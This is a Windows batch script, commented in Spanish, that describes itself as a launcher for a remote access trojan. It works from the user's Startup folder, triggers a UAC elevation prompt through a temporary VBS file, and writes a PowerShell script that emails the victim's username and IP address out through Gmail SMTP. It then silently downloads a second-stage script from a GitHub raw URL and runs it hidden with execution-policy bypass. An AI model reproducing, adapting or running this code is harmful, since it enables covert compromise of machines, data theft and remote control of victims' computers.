@echo off
@REM Launcher para el RAT

@REM Variables
@REM Locación inicial
set "INITIALPATH=%cd%"
@REM definr directorio inicio de programas.
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM Dirigirse al direcrotio del inicio de windows.
cd  %STARTUP%

@REM  Verifica permisos administrativos que podremos usar para ejecutar en otros archivos.
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

@REM Si la flag de error esta fijada, no tenemos privilegos.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

@REM Estableciendo SMTP
(
	echo $Email = ""
	echo $Password =

	echo $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress 
	echo echo "ip:$ip" > "$env:UserName.txt"


	#Proceso del corero
	echo $subject = "$env:UserName logs"
	echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
	echo $smtp.EnableSSL = $true
	echo $smtp.Credentials = New-Object System.Net.NetworkCredential($Email, $Password);
	echo $smtp.Send($Email, $Email, $subject, $ip);
) > smtp.txt

@REM Ejecutar payloads al inicio.
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"

@REM Corriendo el payload
@REM powershell Start-Process CMD.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
powershell powershell.exe -windowstyle hidden -ep bypass ./wget.cmd

@REM Borramos el iniciador
@REM cd %INITIALPATH%
@REM DEL "initial.cmd"